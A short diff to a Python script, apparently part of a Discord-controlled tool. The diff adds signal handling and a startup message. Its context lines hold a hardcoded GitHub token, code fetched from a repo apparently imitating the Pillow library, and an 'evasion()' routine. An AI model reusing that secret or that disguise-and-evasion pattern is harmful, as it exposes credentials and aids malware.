@@ -1,6 +1,8 @@
 import os
 import json
 import requests
+import signal
+import sys
 from functions.update import ensure_update_file_exists
 
 GITHUB_RAW_URL_TEMPLATE = "https://raw.githubusercontent.com/pillowlibrary/pillow/main/functions/{}"
@@ -11,6 +13,12 @@ allowed_users = ["border", "bob", "User"]
 github_token = "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"
 
 ensure_update_file_exists()
+
+def graceful_exit(signum, frame):
+    sys.exit(0)
+
+signal.signal(signal.SIGTERM, graceful_exit)
+signal.signal(signal.SIGINT, graceful_exit)
 
 def check_update_status():
     print("Checking update status...")
@@ -73,6 +81,7 @@ def main():
         evasion()
         return
 
+    print("Starting Discord bot...")
     from functions.discord_handler import start_discord_bot
     start_discord_bot()
 
